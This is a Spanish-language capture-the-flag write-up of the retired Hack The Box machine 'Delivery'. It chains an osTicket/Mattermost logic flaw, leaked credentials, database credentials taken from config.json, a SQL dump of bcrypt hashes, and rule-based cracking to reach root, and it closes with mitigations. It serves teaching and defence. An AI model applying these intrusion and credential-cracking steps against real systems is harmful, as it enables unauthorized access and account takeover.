---
machine: Delivery
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, osticket, mattermost, logic-flaw, bcrypt]
---

# Delivery — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Dos aplicaciones legítimas mal combinadas: osTicket y Mattermost. osTicket da una dirección `@delivery.htb` a cualquiera que abra un ticket como invitado, y Mattermost exige justo ese dominio para registrarse. El correo de verificación llega al hilo del ticket, así que se crea cuenta sin tener buzón. Dentro, el canal interno filtra credenciales y una pista de contraseña; el hash bcrypt de `root` cae con reglas, y `su root` cierra la máquina.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH 7.9p1 Debian 10
80/tcp    http  nginx 1.14.2
8065/tcp  http  Mattermost
```

```bash
echo "<IP> delivery.htb helpdesk.delivery.htb" | sudo tee -a /etc/hosts
```

El HTML de portada menciona los dos hostnames y dice que con una dirección `@delivery.htb` se accede a Mattermost.

## Enumeración

```bash
gobuster dir -u http://delivery.htb/ -w /usr/share/wordlists/dirb/common.txt -t 40
```

Solo estáticos (`/index.html`, `/images`, `/assets`). Lo interesante son los vhosts:

- `helpdesk.delivery.htb` → osTicket, permite abrir tickets sin cuenta.
- `delivery.htb:8065` → Mattermost, registro restringido al dominio interno.

## Foothold

```text
http://helpdesk.delivery.htb/open.php
Email: cualquiera@externo.tld
```

Al crear el ticket se asigna `TICKETID@delivery.htb` como dirección de contacto, y todo lo que se envíe a esa dirección aparece en el hilo.

```text
http://delivery.htb:8065 → Create Account
Email: <TICKETID>@delivery.htb
```

Llega el correo de verificación; se lee en el ticket, se pulsa el enlace y la cuenta queda activa. Es un fallo de lógica: ninguna de las dos aplicaciones es vulnerable por separado.

En el canal `#internal` el usuario `root` publica las credenciales SSH del servicio de correo (`maildeliverer` / `<password>`) y la pista de que todo el equipo reutiliza variantes de `PleaseSubscribe!`, así que conviene atacar con reglas.

```bash
ssh maildeliverer@<IP>
```

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

```bash
cat /opt/mattermost/config/config.json
```

```json
"DataSource": "mmuser:<dbpass>@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4"
```

```bash
mysql -u mmuser -p'<dbpass>' -e "select Username,Password from mattermost.Users"
```

```text
root  $2a$10$...
```

bcrypt con una sola palabra base y reglas:

```bash
echo 'PleaseSubscribe!' > base.txt
john hash.txt --wordlist=base.txt --rules=best64
```

```bash
su root
```

La pista del canal era literal: la contraseña es una **variante de `PleaseSubscribe!`** con sufijos, y la tabla `Users` de Mattermost guarda `$2a$10$`. Sin la pista, bcrypt habría tardado años.

```bash
hashcat -m 3200 hash.txt base.txt -r /usr/share/hashcat/rules/best64.rule
```

## Evidencia

- Ticket con la dirección interna y el correo de verificación (redactado).
- `whoami` → `maildeliverer`, después `root`.
- Hash bcrypt de `root` (redactado).

## Lecciones aprendidas

- Los fallos de lógica entre dos sistemas válidos no necesitan CVE: basta con que uno emita identidades que el otro acepte.
- Un puerto fuera del top 1000 (8065) era la mitad del reto; el escaneo completo es obligatorio.
- `config.json` de una aplicación suele llevar credenciales de base de datos en claro.
- Una pista sobre la contraseña reduce el espacio de bcrypt de siglos a segundos.
- Enumerar usuarios en el canal interno valió más que cualquier exploit.

## Mitigaciones y detección

- No aceptar correos de verificación en direcciones que el propio sistema entrega a invitados; validar el dominio contra el directorio real.
- Restringir el registro de Mattermost por invitación y verificar el buzón por una vía fuera del ticket.
- Sacar credenciales de `config.json` a variables de entorno o a un gestor de secretos.
- Contraseñas de administrador largas y aleatorias; bcrypt no compensa una palabra de diccionario.
- Detección: tickets de invitado que reciben correos de verificación de terceros, registros en Mattermost desde el mismo host, consultas SQL a la base de Mattermost.
- MITRE: T1078, T1552.001, T1110.002.

## Referencias

- Documentación de osTicket sobre direcciones de ticket.
- MITRE ATT&CK: T1078, T1552.001.
